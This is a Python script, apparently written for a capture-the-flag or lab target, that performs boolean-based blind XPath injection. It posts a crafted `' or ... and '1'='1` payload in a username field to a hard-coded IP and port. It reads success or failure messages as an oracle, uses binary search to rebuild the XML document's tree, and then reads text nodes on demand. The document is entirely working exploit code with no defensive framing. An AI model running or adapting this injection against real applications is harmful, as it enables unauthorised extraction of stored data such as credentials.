#!/usr/bin/python3

# XPath盲注脚本 by Sunshine
import requests
import json
import sys
import time
from urllib.parse import quote, urlencode

MODE="boolean-based"
DELAY = 5 # (s)
DELAY_ms = DELAY * 1000 # (ms)
def oracle(expression):
    if (MODE == "time-based"): # XPath time-based auto exfil WIP
        print('WIP')
        return True
    elif (MODE == "boolean-based"):
        payload = quote(f"nonexist' or {expression} and '1'='1")
        data=f'username={payload}&message=test'
        response = requests.post("http://154.57.164.65:30209/index.php", data=data,headers={"Content-Type": "application/x-www-form-urlencoded"})
        if ('Message successfully sent!' in response.text):
            return True
        elif ('User does not exist!' in response.text):
            return False
        else:
            print(f'Invalid response {response.text}')
            sys.exit()
    else:
        sys.exit()

def BisectionGetInteger(target):
    low = 0
    high = 10
    while low < high:
        mid = (low + high) // 2
        if oracle(f"{target}>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

def BisectionGetString(target):
    length = BisectionGetInteger(f'string-length({target})')
    print(f'-| [BINARY SEARCH] Length: {length} | Result: ', end='')
    sys.stdout.flush()
    if length == 0:
        return ""
    alphabets = "~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.-:"
    string = ""
    for i in range(1, length + 1):
        low = 0
        high = len(alphabets) - 1
        while low < high:
            mid = (low + high) // 2
            xpath_expr = f'string-length(substring-before("{alphabets}", substring({target},{i},1)))>{mid}'
            if oracle(xpath_expr):
                low = mid + 1
            else:
                high = mid
        if low == 0:
            string += "?" # Unknown character
        else:
            current = alphabets[low]
            string += current
            print(f'{current}', end='')
            sys.stdout.flush()
    print("")
    return string

# Receive XML structure
def RecurselyBuildStructure(dict, path):
    # Retrieve child element count
    if oracle(f"count({path}*)=0"):
        print(f'[Recurse Scan] No child node in {path}')
        return # No child element
    ChildCount = BisectionGetInteger(f'count({path}*)')
    print(f'[Recurse Scan] Found {ChildCount} child node in {path}')
    while ChildCount != 0:
        NextElement = f'{path}*[{ChildCount}]'
        NextPath = f'{NextElement}/'
        ElementName = BisectionGetString(f'name({NextElement})')
        if ElementName != "": # Indicating a child node
            NextDict = {}
            print(f'[Recurse Scan] Entering {NextPath} | Name {ElementName}')
            RecurselyBuildStructure(NextDict, NextPath)
            dict[ElementName] = NextDict
        else: # Indicating a text node
            dict[ChildCount] = "TextNode"
        ChildCount = ChildCount - 1
    return
dict = {}
path = '/'
RecurselyBuildStructure(dict, path)

import pprint
pprint.pprint(dict, indent=4)

while True:
    node = input("Read Text Node ")
    print(BisectionGetString(node))
